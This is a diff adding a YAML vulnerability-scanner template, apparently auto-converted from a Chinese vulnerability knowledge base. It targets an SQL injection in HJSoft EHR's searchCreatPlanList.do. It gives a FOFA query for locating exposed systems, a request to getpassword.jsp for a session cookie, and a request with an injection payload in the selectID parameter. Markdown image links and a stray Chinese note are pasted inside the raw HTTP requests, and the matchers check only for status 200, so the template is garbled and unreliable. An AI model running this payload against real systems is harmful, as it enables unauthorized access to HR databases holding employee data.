@@ -1,0 +1,45 @@
+id: poc-evf9szmng26l1z6d
+info:
+  name: 宏景EHR searchCreatPlanList.do存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/evf9szmng26l1z6d'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: evf9szmng26l1z6d
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /templates/index/getpassword.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742997212820-2d3e6d77-f978-4ad7-a3fe-900984de29a6.png)
+
+    携带cookie访问'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /train/plan/searchCreatPlanList.do?b_selectPlan=query&selectID=1''%2B(1-@@VERSION)%2B'')--+ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=D3D69E3D8D5CD86DC4B10E91CD2062AB
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1742997213017-3f93fb8f-67ac-449e-b79d-ce489e0e5c83.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
